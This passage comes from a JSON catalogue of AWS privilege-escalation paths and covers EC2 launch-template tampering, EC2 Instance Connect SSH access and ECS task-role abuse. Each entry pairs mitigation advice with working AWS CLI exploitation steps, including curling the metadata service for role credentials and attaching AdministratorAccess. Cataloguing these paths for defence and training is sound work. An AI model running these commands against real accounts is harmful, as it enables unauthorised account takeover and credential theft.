    "recommendation": "Restrict `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions using resource-based policies to limit which templates can be modified:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"ec2:CreateLaunchTemplateVersion\",\n    \"ec2:ModifyLaunchTemplate\"\n  ],\n  \"Resource\": \"arn:aws:ec2:*:ACCOUNT:launch-template/specific-template-id\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:ResourceTag/Environment\": \"dev\"\n    }\n  }\n}\n\nUse Service Control Policies (SCPs) to prevent launch template modifications in production environments unless from approved automation roles.\n\nMonitor CloudTrail for `CreateLaunchTemplateVersion` and `ModifyLaunchTemplate` API calls, especially on templates that reference privileged instance profiles. Alert when default versions are changed.\n\nPin Auto Scaling Groups to specific launch template versions (e.g., `$Latest` or version number) rather than using `$Default`, preventing automatic use of modified default versions.\n\nMonitor EC2 user data for suspicious IAM-related commands using AWS Config rules or custom Lambda functions that inspect new template versions.\n\nRegularly audit existing launch templates to identify those with privileged instance profiles and restrict modification permissions to only necessary principals.\n\nImplement approval workflows for launch template changes using AWS Service Catalog or custom automation with human approval steps.\n\nEnable MFA requirements for sensitive operations like launch template modifications using `aws:MultiFactorAuthPresent` condition keys.\n\nUse IAM Access Analyzer to identify principals with template modification permissions on templates containing privileged roles.\n\nConsider using EC2 Image Builder with locked-down instance profiles instead of relying on user data for configuration.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "AWS EC2 Launch Templates Documentation",
        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-launch-templates.html"
      },
      {
        "title": "AWS Privilege Escalation Methods - Rhino Security Labs",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "ec2-002",
      "ec2-003"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/ec2-createlaunchtemplateversion+ec2-modifylaunchtemplate",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate permissions. Can be an IAM user or role with access to modify existing launch templates.\n"
        },
        {
          "id": "existing_template",
          "label": "Existing Launch Template",
          "type": "resource",
          "description": "An existing EC2 launch template that already references a privileged IAM instance profile in a previous version. The attacker discovers this template through ec2:DescribeLaunchTemplates and identifies the privileged role configuration to exploit. Crucially, modifying this template does NOT require iam:PassRole because the attacker is simply referencing a role configuration that already exists in a previous version.\n"
        },
        {
          "id": "modified_template",
          "label": "Modified Launch Template",
          "type": "resource",
          "description": "The attacker creates a new template version with malicious user data (using ec2:CreateLaunchTemplateVersion) and sets it as the default (using ec2:ModifyLaunchTemplate). The new version keeps the same privileged IAM instance profile from the existing version but injects malicious user data. All future instance launches from this template will now use the malicious configuration.\n"
        },
        {
          "id": "new_instance",
          "label": "New EC2 Instance",
          "type": "resource",
          "description": "An EC2 instance launches from the modified template. This could happen through Auto Scaling Groups, scheduled tasks, or manual launches by other users. The instance automatically receives the privileged IAM role and executes the malicious user data script. The attacker may need to trigger the launch (if they have autoscaling:SetDesiredCapacity) or wait for auto-scaling events or scheduled launches to occur naturally.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the EC2 Service",
          "type": "resource",
          "description": "IAM role that was already configured in the original launch template. The newly launched instance automatically assumes this role through its instance profile. The role's temporary credentials become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The malicious user data script executes with these credentials and attempts to attach AdministratorAccess to the starting principal.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the existing role has IAM write permissions (specifically iam:AttachUserPolicy or AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has persistent full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Limited Escalation Possible",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the existing role has some elevated permissions but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the attacker may still benefit from the instance remaining in a modified state that could be exploited later, potential access to resources the role can reach (S3, DynamoDB, Secrets Manager), or the ability to exfiltrate credentials or data through the instance.\n"
        },
        {
          "id": "no_access",
          "label": "No Effective Escalation",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the existing launch template only references a role with minimal or read-only permissions, the user data script fails to attach any policies and there are no useful resources to access. No effective privilege escalation occurs, though the template remains modified with the malicious configuration.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "existing_template",
          "label": "ec2:DescribeLaunchTemplates",
          "description": "The starting principal enumerates existing launch templates to identify targets with privileged IAM instance profiles.\n\nCommands:\n```bash\naws ec2 describe-launch-templates \\\n  --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \\\n  --output table\n\naws ec2 describe-launch-template-versions \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --versions '$Default' \\\n  --query 'LaunchTemplateVersions[0].LaunchTemplateData'\n```\n"
        },
        {
          "from": "existing_template",
          "to": "modified_template",
          "label": "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate",
          "description": "The starting principal creates a new launch template version that references the existing privileged instance profile and includes malicious user data, then modifies the template to set this version as the new default. This does NOT require iam:PassRole because the attacker is simply referencing a role configuration that already exists in a previous version.\n\nCommands:\n```bash\n# Create new version with malicious user data\naws ec2 create-launch-template-version \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --source-version 1 \\\n  --launch-template-data '{\n    \"IamInstanceProfile\": {\n      \"Name\": \"EXISTING_PRIVILEGED_INSTANCE_PROFILE\"\n    },\n    \"UserData\": \"BASE64_ENCODED_MALICIOUS_SCRIPT\"\n  }'\n\n# Set new version as default\naws ec2 modify-launch-template \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --default-version NEW_VERSION_NUMBER\n```\n\nThe malicious user data script attempts to attach AdministratorAccess to the starting principal using the target role's credentials.\n"
        },
        {
          "from": "modified_template",
          "to": "new_instance",
          "label": "Instance launch triggered",
          "description": "An EC2 instance launches from the modified template. This could be triggered by the attacker (if they have ASG permissions), by auto-scaling events, by scheduled tasks, or by other users manually launching instances.\n\nCommand (if attacker has autoscaling:SetDesiredCapacity):\n```bash\naws autoscaling set-desired-capacity \\\n  --auto-scaling-group-name TARGET_ASG_NAME \\\n  --desired-capacity 1\n```\n\nAlternatively, the attacker may need to wait for these events to occur naturally through normal auto-scaling operations or scheduled instance launches.\n"
        },
        {
          "from": "new_instance",
          "to": "target_role",
          "label": "Instance assumes role",
          "description": "The launched instance automatically assumes the privileged IAM role through its instance profile. The EC2 service provides temporary credentials via the instance metadata service. The malicious user data script executes automatically during instance initialization (typically within 1-2 minutes of launch), running with the target role's credentials.\n"
        },
        {
          "from": "target_role",
          "to": "admin",
          "label": "If role has IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has iam:AttachUserPolicy or equivalent IAM write permissions (such as AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal, granting persistent full administrative access.\n\nExample user data script that executes:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
        },
        {
          "from": "target_role",
          "to": "some_perms",
          "label": "If role has elevated permissions but not IAM write",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the modified template persists and could be exploited in other ways, or the instance could be used as a pivot point to access data or services within the role's permissions.\n"
        },
        {
          "from": "target_role",
          "to": "no_access",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the existing launch template only references a role with minimal or read-only permissions, the user data script fails and there are no useful resources to access. The template remains modified but provides no effective privilege escalation.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-07T04:00:34Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ec2/ec2-004.yaml"
  },
  {
    "id": "ec2instanceconnect-003",
    "name": "ec2-instance-connect:SendSSHPublicKey",
    "category": "access-resource",
    "services": [
      "ec2",
      "ec2-instance-connect"
    ],
    "description": "A principal with `ec2-instance-connect:SendSSHPublicKey` can push a temporary SSH public key to an EC2 instance and establish an SSH connection. If the target EC2 instance has a privileged IAM role attached via an instance profile, the attacker can SSH into the instance and access the instance metadata service (IMDS) to retrieve temporary credentials for that role. This provides the attacker with the full permissions of the instance's IAM role.",
    "prerequisites": {
      "admin": [
        "An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or Ubuntu 16.04+)",
        "The instance must have an IAM role with administrative permissions attached",
        "The instance must be running",
        "Network access must allow SSH (port 22) to the instance"
      ],
      "lateral": [
        "An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or Ubuntu 16.04+)",
        "The instance must have an IAM role attached",
        "The instance must be running",
        "Network access must allow SSH (port 22) to the instance"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws ec2 describe-instances --filters \"Name=instance-state-name,Values=running\"",
          "description": "List running EC2 instances to find targets with privileged roles"
        },
        {
          "step": 2,
          "command": "aws iam get-instance-profile --instance-profile-name INSTANCE_PROFILE_NAME",
          "description": "Check the instance profile to determine the attached role's permissions"
        },
        {
          "step": 3,
          "command": "ssh-keygen -t rsa -f /tmp/temp_key -N \"\"\n",
          "description": "Generate a temporary SSH key pair"
        },
        {
          "step": 4,
          "command": "aws ec2-instance-connect send-ssh-public-key \\\n  --instance-id i-1234567890abcdef0 \\\n  --instance-os-user ec2-user \\\n  --ssh-public-key file:///tmp/temp_key.pub\n",
          "description": "Push the temporary public key to the target instance (valid for 60 seconds)"
        },
        {
          "step": 5,
          "command": "ssh -i /tmp/temp_key ec2-user@INSTANCE_PUBLIC_IP\n",
          "description": "SSH into the instance using the temporary key (must connect within 60 seconds)"
        },
        {
          "step": 6,
          "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n",
          "description": "From the SSH session, retrieve temporary credentials from IMDS"
        },
        {
          "step": 7,
          "command": "export AWS_ACCESS_KEY_ID=<from step 6>\nexport AWS_SECRET_ACCESS_KEY=<from step 6>\nexport AWS_SESSION_TOKEN=<from step 6>\naws sts get-caller-identity\n",
          "description": "Use the stolen credentials to assume the instance role's privileges"
        }
      ]
    },
    "recommendation": "Restrict the `ec2-instance-connect:SendSSHPublicKey` permission using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"ec2-instance-connect:SendSSHPublicKey\",\n  \"Resource\": \"arn:aws:ec2:REGION:ACCOUNT_ID:instance/i-specificinstance\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"ec2:osuser\": \"ec2-user\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Use security groups to restrict SSH access to known IP ranges\n- Monitor CloudTrail for `SendSSHPublicKey` events, especially to instances with privileged roles\n- Implement IMDSv2 (session-oriented) to make credential theft more difficult\n- Use AWS Systems Manager Session Manager instead of SSH for remote access\n- Alert on unusual SSH connections to sensitive instances\n- Consider disabling EC2 Instance Connect on instances with privileged roles\n- Use VPC endpoints to restrict IMDS access\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown",
      "date": ""
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - EC2 Instance Connect",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      },
      {
        "title": "AWS EC2 Instance Connect Documentation",
        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "ec2-002",
      "ssm-001"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/ec2-instance-connect-sendsshpublickey",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "EC2InstanceConnect-SendSSHPublicKey",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "ec2-instance-connect:SendSSHPublicKey",
          "resourceConstraints": "Target EC2 instance must be in the Resource section"
        },
        {
          "permission": "ec2:DescribeInstances",
          "resourceConstraints": "None - typically required to discover instance details"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `ec2-instance-connect:SendSSHPublicKey` permission. This principal can push a temporary SSH public key to an EC2 instance that has EC2 Instance Connect enabled. The SSH key is valid for 60 seconds after being pushed.\n"
        },
        {
          "id": "ec2_instance",
          "label": "Existing EC2 Instance",
          "type": "resource",
          "description": "The target EC2 instance with EC2 Instance Connect enabled (requires Amazon Linux 2 or Ubuntu 16.04+). The instance must be running and have an IAM role attached via an instance profile. Network security groups must allow SSH access (port 22) from the attacker's location.\n"
        },
        {
          "id": "instance_role",
          "label": "Existing Service Role",
          "type": "resource",
          "description": "The IAM role attached to the EC2 instance via instance profile. This role's temporary credentials are available through the Instance Metadata Service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/. Once the attacker gains SSH access to the instance, they can retrieve these credentials and use them from any location.\n"
        },
        {
          "id": "exfiltrate_creds",
          "label": "Exfiltrate credentials via IMDS",
          "type": "action",
          "color": "#99ccff",
          "description": "Once SSH access is established, the attacker can access the Instance Metadata Service (IMDS) to retrieve the temporary security credentials for the instance role. These credentials include AccessKeyId, SecretAccessKey, and SessionToken, which can be exported to environment variables and used with the AWS CLI or SDK from any location.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker gains full administrative access to the AWS account using the exfiltrated credentials. They can perform any action in the account including creating new admin users, modifying resources, or accessing sensitive data.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the instance role has some elevated permissions but not full admin access, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), ability to modify certain resources, or permissions that enable additional privilege escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the instance role only has minimal permissions (such as CloudWatch logs access or basic EC2 describe permissions), the credential exfiltration may not provide meaningful additional access beyond what the starting principal already had. However, even limited access could be useful for reconnaissance.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "ec2_instance",
          "label": "ec2-instance-connect:SendSSHPublicKey",
          "description": "Generate a temporary SSH key pair and push the public key to the target EC2 instance using ec2-instance-connect:SendSSHPublicKey. The public key is valid for 60 seconds, during which the attacker must establish an SSH connection.\n\nCommands:\n```bash\nssh-keygen -t rsa -f /tmp/temp_key -N \"\"\n\naws ec2-instance-connect send-ssh-public-key \\\n  --instance-id i-1234567890abcdef0 \\\n  --instance-os-user ec2-user \\\n  --ssh-public-key file:///tmp/temp_key.pub\n```\n\nAfter pushing the key, immediately establish SSH connection within the 60-second window.\n"
        },
        {
          "from": "ec2_instance",
          "to": "instance_role",
          "label": "SSH access to instance",
          "description": "Use the temporary private key to establish an SSH connection to the EC2 instance. The instance automatically provides access to the attached IAM role's credentials through the Instance Metadata Service.\n\nCommand:\n```bash\nssh -i /tmp/temp_key ec2-user@INSTANCE_PUBLIC_IP\n```\n\nOnce connected, the attacker has shell access to the instance and can interact with IMDS.\n"
        },
        {
          "from": "instance_role",
          "to": "exfiltrate_creds",
          "label": "Access IMDS for credentials",
          "description": "From the SSH session on the EC2 instance, query the Instance Metadata Service (IMDS) to retrieve the temporary security credentials for the instance role. The credentials are available at a predictable URL and include AccessKeyId, SecretAccessKey, and SessionToken.\n\nCommand:\n```bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n```\n\nThe response contains JSON with the temporary credentials that can be used from any location.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "admin_outcome",
          "label": "If instance role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker can use the exfiltrated credentials to gain full control over the AWS account. They can create new admin users, access all resources, modify security configurations, and perform any privileged action.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "partial_outcome",
          "label": "If instance role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the instance role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. Common scenarios include access to S3 buckets, RDS databases, DynamoDB tables, or permissions to modify specific resources. The attacker should enumerate the role's permissions to identify data access or additional escalation paths.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "minimal_outcome",
          "label": "If instance role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the instance role only has minimal permissions such as CloudWatch logs write access or basic EC2 describe permissions, the exfiltrated credentials may not provide significant additional access. However, even limited permissions could reveal information about the environment or be useful as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-05T19:56:13Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ec2-instance-connect/ec2instanceconnect-003.yaml"
  },
  {
    "id": "ecs-001",
    "name": "iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:CreateService",
    "category": "service-passrole",
    "services": [
      "iam",
      "ecs"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Must have permission to pass a role to ecs-tasks.amazonaws.com"
        },
        {
          "permission": "ecs:CreateCluster",
          "resourceConstraints": "Must be able to create ECS clusters"
        },
        {
          "permission": "ecs:RegisterTaskDefinition",
          "resourceConstraints": "Must be able to register task definitions"
        },
        {
          "permission": "ecs:CreateService",
          "resourceConstraints": "Must be able to create ECS services"
        }
      ],
      "additional": [
        {
          "permission": "ec2:DescribeVpcs",
          "resourceConstraints": "Helpful for finding the default VPC for Fargate network configuration"
        },
        {
          "permission": "ec2:DescribeSubnets",
          "resourceConstraints": "Helpful for finding subnets for Fargate network configuration"
        },
        {
          "permission": "ecs:DescribeServices",
          "resourceConstraints": "Useful for monitoring service status during exploitation"
        },
        {
          "permission": "ecs:DescribeTasks",
          "resourceConstraints": "Useful for monitoring task status during exploitation"
        },
        {
          "permission": "ecs:ListTasks",
          "resourceConstraints": "Useful for listing tasks during exploitation"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available privileged roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role permissions and trust policies"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can escalate privileges by creating a new ECS cluster, registering a task definition with a privileged IAM role, and launching the task via an ECS service. The task runs with the permissions of the passed role and can execute arbitrary code using the AWS CLI or SDK to modify the starting principal's permissions. This path is particularly useful because it works with Fargate launch type, eliminating the need for EC2 instance management, and the task automatically receives temporary credentials for the passed role.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts ecs-tasks.amazonaws.com service principal",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts ecs-tasks.amazonaws.com service principal"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity\n",
          "description": "Get the AWS account ID needed for constructing role ARNs"
        },
        {
          "step": 2,
          "command": "aws ecs create-cluster --cluster-name privesc-cluster\n",
          "description": "Create a new ECS cluster to host the privileged task"
        },
        {
          "step": 3,
          "command": "aws ec2 describe-vpcs --filters \"Name=isDefault,Values=true\" --query \"Vpcs[0].VpcId\" --output text\naws ec2 describe-subnets --filters \"Name=vpc-id,Values=<VPC_ID>\" --query \"Subnets[*].SubnetId\" --output text\n",
          "description": "Retrieve the default VPC and subnet IDs required for Fargate network configuration"
        },
        {
          "step": 4,
          "command": "aws ecs register-task-definition \\\n  --family privesc-task \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 \\\n  --memory 512 \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --execution-role-arn \"arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole\" \\\n  --container-definitions '[\n    {\n      \"name\": \"privesc-container\",\n      \"image\": \"amazon/aws-cli\",\n      \"essential\": true,\n      \"command\": [\n        \"iam\", \"attach-user-policy\",\n        \"--user-name\", \"STARTING_USERNAME\",\n        \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"\n      ]\n    }\n  ]'\n",
          "description": "Register a task definition that passes the privileged role and configures a container to execute AWS CLI commands for privilege escalation (e.g., attaching AdministratorAccess policy to the starting user)"
        },
        {
          "step": 5,
          "command": "aws ecs create-service \\\n  --cluster privesc-cluster \\\n  --service-name privesc-service \\\n  --task-definition privesc-task \\\n  --desired-count 1 \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n",
          "description": "Create an ECS service to launch the task. The service will start the task with the privileged role, and the container will execute the escalation command"
        },
        {
          "step": 6,
          "command": "aws ecs list-tasks --cluster privesc-cluster --service-name privesc-service\naws ecs describe-tasks --cluster privesc-cluster --tasks <TASK_ARN>\n",
          "description": "Monitor the task status and wait for it to reach STOPPED status, indicating the escalation commands have completed"
        },
        {
          "step": 7,
          "command": "aws sts get-caller-identity\naws iam list-attached-user-policies --user-name STARTING_USERNAME\n",
          "description": "Verify that the privilege escalation succeeded by checking if AdministratorAccess policy was attached to the starting user"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.\n\nFor Fargate tasks, the container must have network connectivity to execute AWS API calls. The execution role (ecsTaskExecutionRole) needs permissions to pull container images from ECR if using private registries.\n",
    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"\n    }\n  }\n}\n\nRestrict access to `ecs:RegisterTaskDefinition` and `ecs:CreateService` to only principals that require them for legitimate workloads. Consider using tag-based conditions to limit which roles can be passed based on resource tags.\n\nMonitor for unusual ECS activity in CloudTrail:\n- `RegisterTaskDefinition` events with unfamiliar task roles\n- `CreateCluster` followed quickly by `CreateService` from non-DevOps principals\n- Short-lived tasks that make IAM policy changes\n- Tasks using the Fargate launch type from unexpected principals\n\nUse AWS Config rules to detect roles with overly permissive trust policies that allow ecs-tasks.amazonaws.com to assume them.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown",
      "date": "2021"
    },
    "references": [
      {
        "title": "Auditing iam:PassRole: A Problematic Privilege Escalation Permission",
        "url": "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
      },
      {
        "title": "Tales from the cloud trenches: Amazon ECS is the new EC2 for crypto mining",
        "url": "https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/"
      },
      {
        "title": "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers",
        "url": "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-createservice",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "ecs_takeover",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS ECS attacks including privilege escalation through container misconfigurations"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole, ecs:CreateCluster, ecs:RegisterTaskDefinition, and ecs:CreateService permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "task_definition",
          "label": "New ECS Task Definition",
          "type": "resource",
          "description": "The registered ECS task definition with the target role passed via iam:PassRole. The task definition specifies a container image and commands that will execute with the target role's permissions when the task runs.\n"
        },
        {
          "id": "ecs_service",
          "label": "New ECS Service",
          "type": "resource",
          "description": "An ECS service created on Fargate that launches and maintains the task. The service ensures the task runs continuously until it completes its malicious actions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the ecs-tasks Service",
          "type": "resource",
          "description": "The IAM role passed to the ECS task definition. Must trust ecs-tasks.amazonaws.com to assume it. When the task runs, it automatically assumes this role and executes with its permissions.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access. The task can attach admin policies to the starting principal or create new access keys with admin privileges.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to data (S3, RDS, DynamoDB) or permissions enabling additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions, the privilege escalation may not provide meaningful additional access beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "task_definition",
          "label": "iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition",
          "description": "The attacker creates an ECS cluster and registers a task definition that passes a privileged role. The task definition includes a container with commands to escalate privileges.\n\nCommands:\n```bash\naws ecs create-cluster --cluster-name exploit-cluster\naws ecs register-task-definition \\\n  --family privesc-task \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 --memory 512 \\\n  --container-definitions '[{\"name\":\"exploit\",\"image\":\"amazon/aws-cli:latest\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"STARTING_USER\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'\n```\n"
        },
        {
          "from": "task_definition",
          "to": "ecs_service",
          "label": "ecs:CreateService",
          "description": "The attacker creates an ECS service on Fargate that launches the task. The service maintains the task until it completes execution.\n\nCommand:\n```bash\naws ecs create-service \\\n  --cluster exploit-cluster \\\n  --service-name privesc-service \\\n  --task-definition privesc-task \\\n  --desired-count 1 \\\n  --launch-type FARGATE \\\n  --network-configuration \"awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}\"\n```\n"
        },
        {
          "from": "ecs_service",
          "to": "target_role",
          "label": "Service launches task with role",
          "description": "When the ECS service starts, it launches the task which automatically assumes the target role. The container then executes with all permissions granted to the target role.\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the task successfully attaches admin policies to the starting principal, granting full administrative access to the account.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the task can perform limited privilege escalation. This might include accessing sensitive data or performing actions that enable further escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal permissions, the task execution may not yield meaningful privilege escalation. However, even limited access could be useful for reconnaissance.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-11T01:49:54Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ecs/ecs-001.yaml"
  },
  {
    "id": "ecs-002",
    "name": "iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask",
    "category": "service-passrole",
    "services": [
      "iam",
      "ecs"
    ],
    "permissions": {
      "required": [
        {
